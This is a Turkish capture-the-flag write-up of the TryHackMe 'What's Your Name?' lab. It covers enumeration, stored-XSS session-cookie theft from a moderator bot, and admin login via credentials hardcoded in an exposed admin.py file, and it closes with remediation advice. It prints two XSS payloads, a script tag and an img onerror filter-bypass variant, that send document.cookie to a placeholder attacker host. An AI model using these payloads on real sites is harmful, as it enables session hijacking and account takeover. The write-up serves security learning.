# 🛡️ TryHackMe: What's Your Name? - Write-Up & Technical Notes

**Zorluk Seviyesi:** Medium  
**Odaklanılan Zafiyetler:** Stored XSS (İstemci Taraflı), Information Disclosure (Bilgi İfşası / Kaynak Kod Sızıntısı), Hardcoded Credentials (Koda Gömülü Kimlik Bilgileri).

---

## 🛠️ 1. Keşif ve Bilgi Toplama (Enumeration)

Operasyona başlamadan önce, hedef sistemin IP adresi ve alt alan adları yerel adres defterine (`/etc/hosts`) eklendi:
```text
<HEDEF_IP> worldwap.thm login.worldwap.thm
```

### Port Tarama (Nmap)
Sistem üzerinde yapılan taramada 3 adet açık port tespit edildi:
* **22/TCP:** SSH
* **80/TCP:** HTTP (Ana Web Uygulaması)
* **8081/TCP:** HTTP (Alternatif Servis)

### Dizin Taraması (Directory Fuzzing)
Port 80 üzerinde yapılan fuzzing çalışmaları sonucunda kritik dizinler ve dosyalar listelendi:
* `/public` ve `/public/html` dizinleri altındaki statik dosyalar.
* `/api` dizini altında çalışan backend servisleri.
* Ana uygulamanın kullanıcıyı `login.worldwap.thm` alt alan adına yönlendirdiği tespit edildi.

---

## 🥷 2. İlk Erişim: İstemci Taraflı XSS ile Moderatör Oturumunu Ele Geçirme

Kayıt (Register) sayfası incelendiğinde, girilen kullanıcı detaylarının arka planda bir site moderatörü tarafından inceleneceğine dair kritik bir mantıksal ipucu elde edildi.

### Zafiyet Tespiti
Kullanıcı oturum çerezleri (Cookies) incelendiğinde, oturum yönetiminde güvenlik için kritik olan `HttpOnly` bayrağının **false** olarak ayarlandığı görüldü. Bu durum, tarayıcıda çalışan JavaScript kodlarının çerez değerlerine doğrudan erişebileceği anlamına gelmektedir.

### Sömürü (Exploitation)
Moderatör botunun yeni kayıtları incelediği sayfadaki girdi alanlarının (Email ve Name) girdileri temizlemediği (Sanitization eksikliği) anlaşıldı. Moderatörün çerezini çalmak için kayıt formundaki Email alanına sinsi bir Stored XSS payload'u enjekte edildi:

```html
<script>window.location='http://<ATTACKER_IP>:<PORT>/?'+document.cookie;</script>
```

* **Alternatif Filtre Bypass Yöntemi (Görüntü Etiketi):**
```html
<img src="x" onerror="window.location='http://<ATTACKER_IP>:<PORT>/?'+document.cookie;" />
```

Saldırgan makinesinde başlatılan dinleyiciye (`netcat`) moderatör botunun sayfayı ziyaret etmesiyle birlikte taze `session` çerezi düştü. Tarayıcı Geliştirici Araçları (F12) kullanılarak bu çerez mevcut oturumla değiştirildi ve **Moderatör Paneline** erişim sağlandı.

---

## 👑 3. Yetki Yükseltme: Kaynak Kod Sızıntısı & Doğrudan Admin Erişimi

Moderatör yetkileriyle sistem üzerinde derinlemesine inceleme ve dizin taramaları (Fuzzing) devam ettirildi. 

### Bilgi İfşası (Information Disclosure)
`login.worldwap.thm` alt alan adı üzerinde yapılan uzantı bazlı fuzzing çalışmaları neticesinde, web sunucusunda açıkta unutulmuş ve dışarıdan doğrudan erişilebilir durumda olan bir Python dosyası tespit edildi:
* **Uç Nokta:** `http://login.worldwap.thm/admin.py`

### Hardcoded Credentials
Söz konusu `admin.py` dosyası tarayıcı veya curl ile okunduğunda, yazılımcı tarafından kaynak kodun içerisine doğrudan gömülmüş (hardcoded) statik kullanıcı adı ve şifre bilgileri ele geçirildi. 

Bu sayede, herhangi bir karmaşık exploit zincirine veya chatbot üzerinden CSRF (Cross-Site Request Forgery) tetikleme adımlarına ihtiyaç kalmadan, doğrudan elde edilen yasal kimlik bilgileri kullanılarak `login.worldwap.thm` ekranından giriş yapıldı. Sunucu üzerinde tam yetkili **Admin** paneline erişilerek nihai bayraklar (flags) başarıyla yakalandı.

---

## 🏁 4. Güvenlik Önerileri ve Güçlendirme (Remediation)

### 1. Kaynak Kod Sızıntısı ve Bilgi İfşasının Önlenmesi
* **Geliştirme Dosyaları:** Canlı ortama (Production) geçiş yapılmadan önce `.py`, `.bak`, `.git` gibi kaynak kod ve konfigürasyon dosyaları sunucudan tamamen temizlenmelidir.
* **Sunucu Yapılandırması:** Web sunucusu (Apache/Nginx) ayarlarında sadece çalıştırılması gereken dosyaların (Örn: `.php`, `.html`) dışarıya sunulması sağlanmalı, hassas uzantılara erişim tamamen yasaklanmalıdır.
* **Gömülü Kimlik Bilgileri:** Şifreler ve API anahtarları asla kaynak kodun içine yazılmamalıdır. Bunun yerine çevre değişkenleri (Environment Variables) veya güvenli anahtar yönetim sistemleri (Vault) kullanılmalıdır.

### 2. XSS ve Oturum Güvenliğinin Sağlanması
* **HttpOnly Bayrağı:** Oturum çerezlerinin (Session Cookies) `HttpOnly` bayrağı kesinlikle **true** yapılmalıdır. Bu sayede XSS zafiyeti olsa dahi JavaScript kodlarının çerezi çalması tarayıcı seviyesinde engellenir.
* **Girdi Doğrulama ve Çıktı Kodlama:** Kullanıcıdan alınan tüm girdiler beyaz liste mantığıyla filtrelenmeli, ekrana basılırken HTML Entity Encoding işleminden geçirilmelidir.
